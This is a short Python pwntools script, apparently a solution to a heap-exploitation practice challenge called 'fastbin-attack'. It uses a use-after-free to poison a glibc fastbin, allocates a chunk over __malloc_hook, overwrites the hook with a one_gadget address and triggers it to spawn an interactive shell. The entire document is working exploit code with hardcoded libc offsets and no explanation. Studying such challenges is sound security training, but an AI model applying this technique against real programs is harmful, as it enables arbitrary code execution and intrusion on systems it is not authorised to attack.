from pwn import *
#context.log_level = "debug"
p = process("./fastbin-attack")

elf = ELF("./fastbin-attack")

a = elf.libc
#gdb.attach(p)
def add(idx,size):
    p.recvuntil("option: \n")
    p.sendline(str(1))
    p.recvuntil("index: \n")
    p.sendline(str(idx))
    p.recvuntil("content size: \n")
    p.sendline(str(size))

def delete(idx):
    p.recvuntil("option: \n")
    p.sendline(str(2))
    p.recvuntil("index: \n")
    p.sendline(str(idx))

def myprint(idx):
    p.recvuntil("option: \n")
    p.sendline(str(3))
    p.recvuntil("index: \n")
    p.sendline(str(idx))

def edit(idx,content):
    p.recvuntil("option: \n")
    p.sendline(str(4))
    p.recvuntil("index: \n")
    p.sendline(str(idx))
    p.recvuntil("content: \n")
    p.sendline(content)


libc_base = 0x7ffff7a0e000
one_gadget_off = 0xf0897
one_gadget = libc_base + one_gadget_off

malloc_hook_off = 0x3c3b10
malloc_hook = libc_base + malloc_hook_off



add(0, 0x60) # idx = 0
delete(0)
edit(0, p64(malloc_hook-0x23))

#gdb.attach(p, "b*0x40087f") #break at menu

add(1, 0x60) # idx = 1
add(2, 0x60) # idx = 2
edit(2, bytes('a','latin-1')*0x13+p64(one_gadget))


add(3, 0x60) # idx = 3
p.interactive()
